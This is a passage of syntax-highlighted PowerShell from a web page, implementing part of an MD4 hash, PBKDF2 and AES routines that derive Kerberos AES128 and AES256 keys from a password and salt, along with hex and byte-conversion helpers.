class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">16</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">19</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">48</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">51</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">15</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">8</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">11</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">40</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">43</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">24</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">27</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">56</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">59</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">15</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">7</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">36</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">39</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">20</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">23</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">52</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">55</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">15</span>)<br><br>        <span class="hljs-variable">$A</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$A</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$D</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">12</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">15</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">3</span>)<br>        <span class="hljs-variable">$D</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$D</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$B</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$C</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">44</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">47</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">9</span>)<br>        <span class="hljs-variable">$C</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$C</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$B</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">28</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">31</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">11</span>)<br>        <span class="hljs-variable">$B</span> = [<span class="hljs-type">Shift</span>]::Left((<span class="hljs-variable">$B</span> + (HH <span class="hljs-literal">-X</span> <span class="hljs-variable">$C</span> <span class="hljs-literal">-Y</span> <span class="hljs-variable">$D</span> <span class="hljs-literal">-Z</span> <span class="hljs-variable">$A</span>) + [<span class="hljs-type">BitConverter</span>]::ToUInt32(<span class="hljs-variable">$M</span>[(<span class="hljs-variable">$i</span> + <span class="hljs-number">60</span>)<span class="hljs-type">..</span>(<span class="hljs-variable">$i</span> + <span class="hljs-number">63</span>)], <span class="hljs-number">0</span>) + <span class="hljs-number">0</span>x6ED9EBA1) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue, <span class="hljs-number">15</span>)<br>        <span class="hljs-comment"># Round 3 end</span><br>        <span class="hljs-comment"># Increment start</span><br>        <span class="hljs-variable">$A</span> = (<span class="hljs-variable">$A</span> + <span class="hljs-variable">$AA</span>) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue<br>        <span class="hljs-variable">$B</span> = (<span class="hljs-variable">$B</span> + <span class="hljs-variable">$BB</span>) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue<br>        <span class="hljs-variable">$C</span> = (<span class="hljs-variable">$C</span> + <span class="hljs-variable">$CC</span>) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue<br>        <span class="hljs-variable">$D</span> = (<span class="hljs-variable">$D</span> + <span class="hljs-variable">$DD</span>) <span class="hljs-operator">-band</span> [<span class="hljs-type">uint32</span>]::MaxValue<br>        <span class="hljs-comment"># Increment end</span><br>    &#125;<br>    <span class="hljs-comment"># Output start</span><br>    <span class="hljs-variable">$A</span> = (<span class="hljs-string">&#x27;&#123;0:x8&#125;&#x27;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$A</span>) <span class="hljs-operator">-ireplace</span> <span class="hljs-string">&#x27;^(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)$&#x27;</span>, <span class="hljs-string">&#x27;$4$3$2$1&#x27;</span><br>    <span class="hljs-variable">$B</span> = (<span class="hljs-string">&#x27;&#123;0:x8&#125;&#x27;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$B</span>) <span class="hljs-operator">-ireplace</span> <span class="hljs-string">&#x27;^(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)$&#x27;</span>, <span class="hljs-string">&#x27;$4$3$2$1&#x27;</span><br>    <span class="hljs-variable">$C</span> = (<span class="hljs-string">&#x27;&#123;0:x8&#125;&#x27;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$C</span>) <span class="hljs-operator">-ireplace</span> <span class="hljs-string">&#x27;^(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)$&#x27;</span>, <span class="hljs-string">&#x27;$4$3$2$1&#x27;</span><br>    <span class="hljs-variable">$D</span> = (<span class="hljs-string">&#x27;&#123;0:x8&#125;&#x27;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$D</span>) <span class="hljs-operator">-ireplace</span> <span class="hljs-string">&#x27;^(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)$&#x27;</span>, <span class="hljs-string">&#x27;$4$3$2$1&#x27;</span><br>    <span class="hljs-comment"># Output end</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$UpperCase</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-variable">$A</span><span class="hljs-variable">$B</span><span class="hljs-variable">$C</span><span class="hljs-variable">$D</span>&quot;</span>.ToUpper()<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;<span class="hljs-variable">$A</span><span class="hljs-variable">$B</span><span class="hljs-variable">$C</span><span class="hljs-variable">$D</span>&quot;</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-PBKDF2</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$PasswordString</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$SALT</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)][<span class="hljs-type">ValidateSet</span>(<span class="hljs-string">&quot;16&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>)][<span class="hljs-built_in">String</span>[]]<span class="hljs-variable">$KeySize</span><br>)<br><br><span class="hljs-comment">### Set Key Size</span><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$KeySize</span>)&#123;<br><span class="hljs-string">&quot;16&quot;</span>&#123;<br>    [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$size</span> = <span class="hljs-number">16</span><br>    <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-string">&quot;32&quot;</span>&#123;<br>    [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$size</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">break</span>;<br>     &#125;<br>default&#123;&#125;<br>&#125;<br><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$password</span> = [<span class="hljs-type">Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$PasswordString</span>)<br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$saltBytes</span> = [<span class="hljs-type">Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$SALT</span>)<br><br><span class="hljs-comment">#PBKDF2 IterationCount=4096</span><br><span class="hljs-variable">$deriveBytes</span> = <span class="hljs-built_in">new-Object</span> Security.Cryptography.Rfc2898DeriveBytes(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$saltBytes</span>, <span class="hljs-number">4096</span>)<br><br><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment">$hexStringSALT = Get-HexStringFromByteArray -Data $deriveBytes.Salt    </span><br><span class="hljs-comment">Write-Host &quot;SALT (HEX):&quot;$hexStringSALT -ForegroundColor Yellow</span><br><span class="hljs-comment">#&gt;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$deriveBytes</span>.GetBytes(<span class="hljs-variable">$size</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Encrypt-AES</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$KeyData</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$IVData</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$Data</span><br>)<br><br><span class="hljs-comment">### AES 128-CTS</span><br><span class="hljs-comment"># KeySize = 16</span><br><span class="hljs-comment"># AESKey = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data NFoldText</span><br><br><span class="hljs-comment">### AES 256-CTS</span><br><span class="hljs-comment"># KeySize = 32</span><br><span class="hljs-comment"># K1 = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data NFoldText</span><br><span class="hljs-comment"># K2 = Encrypt-AES -KeyData PBKdf2 -IVData IV -Data K1</span><br><span class="hljs-comment"># AESKey = K1 + K2</span><br><br><span class="hljs-comment"># Create AES Object</span><br>    <span class="hljs-variable">$Aes</span> = <span class="hljs-variable">$null</span><br>    <span class="hljs-variable">$encryptor</span> = <span class="hljs-variable">$null</span><br>    <span class="hljs-variable">$memStream</span> = <span class="hljs-variable">$null</span><br>    <span class="hljs-variable">$cryptoStream</span> = <span class="hljs-variable">$null</span><br>    <span class="hljs-variable">$AESKey</span> = <span class="hljs-variable">$null</span><br>    <br>    <span class="hljs-variable">$Aes</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.AesManaged<br>    <span class="hljs-variable">$Aes</span>.Mode = [<span class="hljs-type">System.Security.Cryptography.CipherMode</span>]::CBC<br>    <span class="hljs-variable">$Aes</span>.Padding = [<span class="hljs-type">System.Security.Cryptography.PaddingMode</span>]::None<br>    <span class="hljs-variable">$Aes</span>.BlockSize = <span class="hljs-number">128</span><br><br>    <span class="hljs-variable">$encryptor</span> = <span class="hljs-variable">$Aes</span>.CreateEncryptor(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$IV</span>)<br>    <span class="hljs-variable">$memStream</span> = <span class="hljs-built_in">new-Object</span> IO.MemoryStream<br><br>    [<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$AESKey</span> = <span class="hljs-selector-tag">@</span>()<br>    <span class="hljs-variable">$cryptoStream</span> = <span class="hljs-built_in">New-Object</span> System.Security.Cryptography.CryptoStream(<span class="hljs-variable">$memStream</span>, <span class="hljs-variable">$encryptor</span>, [<span class="hljs-type">System.Security.Cryptography.CryptoStreamMode</span>]::<span class="hljs-built_in">Write</span>)<br>    <span class="hljs-variable">$cryptoStream</span>.Write(<span class="hljs-variable">$Data</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$Data</span>.Length)<br>    <span class="hljs-variable">$CryptoStream</span>.FlushFinalBlock()<br>    <span class="hljs-variable">$cryptoStream</span>.Close()<br><br>    <span class="hljs-variable">$AESKey</span> = <span class="hljs-variable">$memStream</span>.ToArray()<br>    <span class="hljs-variable">$memStream</span>.Close()<br>    <span class="hljs-variable">$Aes</span>.Dispose()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$AESKey</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-AES128Key</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$PasswordString</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$SALT</span>=<span class="hljs-string">&quot;&quot;</span><br>)<br><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$PBKDF2</span> = <span class="hljs-built_in">Get-PBKDF2</span> <span class="hljs-literal">-PasswordString</span> <span class="hljs-variable">$passwordString</span> <span class="hljs-literal">-SALT</span> <span class="hljs-variable">$SALT</span> <span class="hljs-literal">-KeySize</span> <span class="hljs-number">16</span><br><span class="hljs-comment">#[byte[]] $nFolded = (Get-NFold-Bytes -Data ([Text.Encoding]::ASCII.GetBytes(&quot;kerberos&quot;)) -KeySize 16)</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nFolded</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">107</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">98</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">123</span>,<span class="hljs-number">155</span>,<span class="hljs-number">91</span>,<span class="hljs-number">43</span>,<span class="hljs-number">147</span>,<span class="hljs-number">19</span>,<span class="hljs-number">43</span>,<span class="hljs-number">147</span>)<br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$Key</span> = <span class="hljs-variable">$PBKDF2</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$IV</span> =  <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br><span class="hljs-variable">$AES128Key</span> = Encrypt<span class="hljs-literal">-AES</span> <span class="hljs-literal">-KeyData</span> <span class="hljs-variable">$key</span> <span class="hljs-literal">-IVData</span> <span class="hljs-variable">$IV</span> <span class="hljs-literal">-Data</span> <span class="hljs-variable">$nFolded</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-HexStringFromByteArray</span> <span class="hljs-literal">-Data</span> <span class="hljs-variable">$AES128Key</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-AES256Key</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$PasswordString</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$SALT</span>=<span class="hljs-string">&quot;&quot;</span><br>)<br><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$PBKDF2</span> = <span class="hljs-built_in">Get-PBKDF2</span> <span class="hljs-literal">-PasswordString</span> <span class="hljs-variable">$passwordString</span> <span class="hljs-literal">-SALT</span> <span class="hljs-variable">$SALT</span> <span class="hljs-literal">-KeySize</span> <span class="hljs-number">32</span><br><span class="hljs-comment">#[byte[]] $nFolded = (Get-NFold-Bytes -Data ([Text.Encoding]::ASCII.GetBytes(&quot;kerberos&quot;)) -KeySize 16)</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nFolded</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">107</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">98</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">123</span>,<span class="hljs-number">155</span>,<span class="hljs-number">91</span>,<span class="hljs-number">43</span>,<span class="hljs-number">147</span>,<span class="hljs-number">19</span>,<span class="hljs-number">43</span>,<span class="hljs-number">147</span>)<br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$Key</span> = <span class="hljs-variable">$PBKDF2</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$IV</span> =  <span class="hljs-selector-tag">@</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br><span class="hljs-variable">$k1</span> = Encrypt<span class="hljs-literal">-AES</span> <span class="hljs-literal">-KeyData</span> <span class="hljs-variable">$key</span> <span class="hljs-literal">-IVData</span> <span class="hljs-variable">$IV</span> <span class="hljs-literal">-Data</span> <span class="hljs-variable">$nFolded</span><br><span class="hljs-variable">$k2</span> = Encrypt<span class="hljs-literal">-AES</span> <span class="hljs-literal">-KeyData</span> <span class="hljs-variable">$key</span> <span class="hljs-literal">-IVData</span> <span class="hljs-variable">$IV</span> <span class="hljs-literal">-Data</span> <span class="hljs-variable">$k1</span><br><br><span class="hljs-variable">$AES256Key</span> = <span class="hljs-variable">$k1</span> + <span class="hljs-variable">$k2</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-HexStringFromByteArray</span> <span class="hljs-literal">-Data</span> <span class="hljs-variable">$AES256Key</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-HexStringFromByteArray</span></span>&#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>,<span class="hljs-type">Position</span>=<span class="hljs-number">0</span>)][<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$Data</span><br>)<br><span class="hljs-variable">$hexString</span> = <span class="hljs-variable">$null</span><br><br>        <span class="hljs-variable">$sb</span> = <span class="hljs-built_in">New-Object</span> System.Text.StringBuilder (<span class="hljs-variable">$Data</span>.Length * <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Data</span>)<br>        &#123;<br>            <span class="hljs-variable">$sb</span>.AppendFormat(<span class="hljs-string">&quot;&#123;0:x2&#125;&quot;</span>, <span class="hljs-variable">$b</span>) |<span class="hljs-built_in">Out-Null</span><br>        &#125;<br>        <span class="hljs-variable">$hexString</span> = <span class="hljs-variable">$sb</span>.ToString().ToUpper([<span class="hljs-type">CultureInfo</span>]::InvariantCulture)<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$hexString</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-ByteArrayFromHexString</span></span>&#123;<br><span class="hljs-keyword">param</span> <br>(<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)][<span class="hljs-built_in">String</span>]<span class="hljs-variable">$HexString</span><br>)<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$bytes</span> = <span class="hljs-selector-tag">@</span>()<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$HexString</span>.Length)<br>        &#123;<br>            <span class="hljs-variable">$chars</span> = <span class="hljs-variable">$HexString</span>.SubString(<span class="hljs-variable">$i</span>, <span class="hljs-number">2</span>)<br>            <span class="hljs-variable">$b</span> = [<span class="hljs-type">Convert</span>]::ToByte(<span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>)<br>            <span class="hljs-variable">$bytes</span> += <span class="hljs-variable">$b</span><br>            <span class="hljs-variable">$i</span> = <span class="hljs-variable">$i</span>+<span class="hljs-number">2</span><br>        &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$bytes</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-BytesBigEndian</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$Value</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)][<span class="hljs-type">ValidateSet</span>(<span class="hljs-string">&quot;16&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>)][<span class="hljs-built_in">String</span>[]]<span class="hljs-variable">$BitSize</span><br>)<br><br><span class="hljs-comment">### Set Key Type</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$bytes</span> = <span class="hljs-selector-tag">@</span>()<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$BitSize</span>)&#123;<br><span class="hljs-string">&quot;16&quot;</span>&#123;<br>    <span class="hljs-variable">$bytes</span> = [<span class="hljs-type">BitCOnverter</span>]::GetBytes([<span class="hljs-built_in">int</span><span class="hljs-type">16</span>]<span class="hljs-variable">$Value</span>)<br>    <span class="hljs-keyword">if</span>([<span class="hljs-type">BitCOnverter</span>]::IsLittleEndian)&#123;<br>    [<span 